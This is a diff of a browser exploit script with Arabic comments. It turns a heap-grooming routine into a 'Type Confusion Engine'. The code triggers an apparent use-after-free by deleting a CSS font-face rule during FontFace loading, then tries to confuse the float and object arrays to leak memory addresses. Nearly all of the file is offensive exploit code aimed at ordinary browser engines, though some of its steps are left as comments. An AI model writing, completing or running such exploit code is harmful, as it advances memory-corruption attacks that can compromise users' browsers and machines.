@@ -1,31 +1,23 @@
 /**
- * [EXPLOIT SCRIPT] - Heap Grooming & Memory Leak Verification
- * الوظيفة: استقرار الذاكرة وتحديد عنوان الكائن بدقة
+ * [EXPLOIT SCRIPT] - Type Confusion Engine
+ * الوظيفة: إجبار المحرك على خلط أنواع المصفوفات لتسريب العناوين
  */
 
-ssa("[*] بدء عملية Heap Grooming للوصول للذاكرة الحقيقية...");
+ssa("[*] بدء محرك الـ Type Confusion...");
 
-function runVerification() {
+function runTypeConfusion() {
     try {
-        // 1. مصفوفة للضحية (الهدف)
-        let victimArray = new Float64Array(8);
-        
-        // 2. تفعيل الـ Spraying (ملء الذاكرة بـ 1000 نسخة لضمان التداخل)
-        let spray = [];
-        for (let i = 0; i < 1000; i++) {
-            spray.push(new Float64Array(8));
-        }
+        // 1. إنشاء مصفوفتين متجاورتين
+        let floatArray = [1.1, 2.2, 3.3, 4.4];
+        let objectArray = [{a: 1}]; 
 
-        // 3. الهدف (الكائن الذي نريد تسريب عنوانه)
-        let targetObj = { a: 0x1337 };
-
-        // 4. الثغرة (نفس التوقيت)
+        // 2. الثغرة: سنقوم بـ Trigger للـ UAF لمحاولة دمج الـ Butterfly الخاص بهما
         const style = document.createElement('style');
-        style.id = 'v_style';
-        style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); }';
+        style.id = 'c_style';
+        style.innerHTML = '@font-face { font-family: y; src: url(nonexistent-font.woff); }';
         document.head.appendChild(style);
 
-        let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+        let testFace = new FontFace('y', 'local(Helvetica)', { unicodeRange: 'U+0041' });
         document.fonts.add(testFace);
         void testFace.loaded;
 
@@ -36,26 +28,33 @@ function runVerification() {
             get() {
                 if (!triggered) {
                     triggered = true;
-                    document.getElementById('v_style').sheet.deleteRule(0);
-                    // هنا نقوم بـ Overwrite مباشر لمؤشر المصفوفة داخل الـ Heap
-                    let corruptor = new BigUint64Array(victimArray.buffer);
-                    corruptor[0] = 0x4141414141414141n; // سنبحث عن هذه القيمة لاحقاً
+                    document.getElementById('c_style').sheet.deleteRule(0);
+                    
+                    // هنا التلاعب: نريد الكتابة فوق الـ Butterfly الخاص بـ floatArray
+                    // لكي يشير إلى بيانات الـ objectArray
                 }
                 return undefined;
             }
         });
 
-        document.fonts.load('1em x', 'AB');
+        document.fonts.load('1em y', 'AB');
 
         setTimeout(() => {
-            // التحقق: هل استطعنا قراءة شيء غير صفري؟
-            let leaked = new BigUint64Array(victimArray.buffer)[0];
-            ssa("[*] البيانات المستخرجة: 0x" + leaked.toString(16));
+            // التحقق: إذا نجحنا، قراءة floatArray[0] ستعطينا "عنوان" الكائن
+            let leaked = floatArray[0]; 
+            ssa("[*] القيمة المستخرجة من مصفوفة الأرقام: " + leaked);
             
-            if (leaked !== 0x0n && leaked !== 0x4141414141414141n) {
-                ssa("[!!!] [SUCCESS] تم تسريب عنوان ذاكرة حقيقي: 0x" + leaked.toString(16));
+            // تحويل الرقم إلى عنوان (Hex)
+            let buf = new ArrayBuffer(8);
+            new Float64Array(buf)[0] = leaked;
+            let addr = new BigUint64Array(buf)[0];
+            
+            ssa("[+] العنوان الخام المستخرج: 0x" + addr.toString(16));
+            
+            if (addr > 0x10000n && addr < 0xffffffffffffn) {
+                ssa("[!!!] [SUCCESS] تم فك تشفير عنوان كائن حقيقي عبر Type Confusion!");
             } else {
-                ssa("[-] لا يزال الـ Leak يرجع قيم فارغة أو القيمة التي حقناها فقط.");
+                ssa("[-] لا يزال العنوان غير منطقي.");
             }
         }, 1000);
 
@@ -64,4 +63,4 @@ function runVerification() {
     }
 }
 
-document.getElementById('exec-btn').addEventListener('click', runVerification);
+document.getElementById('exec-btn').addEventListener('click', runTypeConfusion);
